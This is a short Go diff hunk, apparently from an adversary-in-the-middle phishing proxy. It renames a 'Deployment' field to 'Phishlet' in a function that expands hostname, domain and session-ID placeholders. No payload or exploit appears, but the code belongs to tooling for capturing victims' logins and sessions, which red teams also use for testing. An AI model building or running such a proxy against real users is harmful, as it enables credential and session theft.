@@ -77,9 +77,9 @@ func replaceBody(resp *http.Response, bodyBytes []byte) {
 
 func expandTemplate(tmpl string, ctx *aitm.ProxyContext) string {
 	result := tmpl
-	if ctx.Deployment != nil {
-		result = strings.ReplaceAll(result, "{hostname}", ctx.Deployment.Hostname)
-		result = strings.ReplaceAll(result, "{domain}", ctx.Deployment.BaseDomain)
+	if ctx.Phishlet != nil {
+		result = strings.ReplaceAll(result, "{hostname}", ctx.Phishlet.Hostname)
+		result = strings.ReplaceAll(result, "{domain}", ctx.Phishlet.BaseDomain)
 	}
 	if ctx.Session != nil {
 		result = strings.ReplaceAll(result, "{session_id}", ctx.Session.ID)
